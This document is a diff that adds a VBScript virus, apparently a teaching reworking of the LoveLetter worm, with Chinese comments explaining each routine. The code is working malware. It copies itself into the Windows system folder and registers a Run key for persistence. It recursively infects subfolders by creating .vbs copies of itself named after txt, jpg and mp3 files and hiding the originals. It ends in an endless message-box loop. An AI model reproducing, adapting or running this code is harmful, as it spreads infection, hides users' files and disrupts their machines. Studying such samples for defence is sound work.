@@ -1,0 +1,80 @@
+Rem barok -loveletter(vbe) <i hate go to school>
+Rem by:spyder/ispyder@mail.com/@GRAMMERSoftGroup/Manila,Philippines
+
+'On Error Resume Next
+Dim fso,dirsystem,file,vbscopy,folder
+Set fso = CreateObject("Scripting.FileSystemObject")	'创建文件对象
+Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
+Set folder = fso.GetFile(WScript.ScriptFullname).ParentFolder
+vbscopy = file.ReadAll	'将病毒全部代码赋给vbscopy
+
+main()
+	
+Sub main()
+	'On Error Resume Next
+	Dim wscr,c
+	Set wscr = CreateObject("WScript.Shell")
+	Set dirsystem = fso.GetSpecialFolder(1)	'获取System目录
+	Set c = fso.GetFile(WScript.ScriptFullName)	'通过正在执行脚本路径获取病毒文件
+	
+	c.Copy(dirsystem&"\MSKernel32.vbs")	'备份病毒到如下目录中
+	
+	'开始调用几个功能模块
+	regruns()	'修改注册表
+	'folderlist("D:\ExpNIC\VirusAD\Tools\ScriptVir\VBA\")	'感染指定目录下的文件
+	msgbox(folder.path)
+	folderlist(folder.path)
+	runmsg()	'显示病毒发作
+End Sub
+
+Sub regruns()	'在注册表中创建自启动项
+	'On Error Resume Next
+	regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
+End Sub
+
+
+Sub regcreate(regkey,regvalue)	'修改注册表（创建键值）
+	On Error Resume Next
+	Set regedit = CreateObject("WScript.Shell")
+	regedit.RegWrite regkey,regvalue
+End Sub
+
+
+Sub infectfiles(folderspec)	'执行传染文件操作
+	On Error Resume Next
+	Dim f,f1,fc,ext,s,m
+	Set f = fso.GetFolder(folderspec)
+	Set fc = f.Files
+	For Each f1 in fc
+		ext = fso.GetExtensionName(f1.path)	'取后缀
+		ext = LCase(ext)	'将后缀转换为小写
+		If (ext="txt") or (ext="jpg") or (ext="mp3") Then	'此3种文件被感染
+				Set m = fso.CreateTextFile(f1.path&".vbs")	'创建以被感染文件名命名的病毒副本
+				m.write vbscopy
+				m.close
+				If (f1.attributes = 0 or f1.attributes = 32 or f1.attributes = 2080) Then	'隐藏原文件
+					f1.attributes = 2
+				End If
+		End If
+	Next
+End Sub
+
+
+Sub folderlist(folderspec)	'遍历文件夹
+	On Error Resume Next
+	Dim f,f1,sf
+	Set f = fso.GetFolder(folderspec)
+	Set sf = f.SubFolders
+	For each f1 in sf
+		infectfiles(f1.path)	'感染目录中的文件
+		folderlist(f1.path)	'递归，继续搜索子目录
+	Next
+End Sub
+
+Sub runmsg
+	On Error Resume Next
+	Dim i
+	While i = 0  
+   		MsgBox ("病毒发作")
+	Wend 
+End Sub
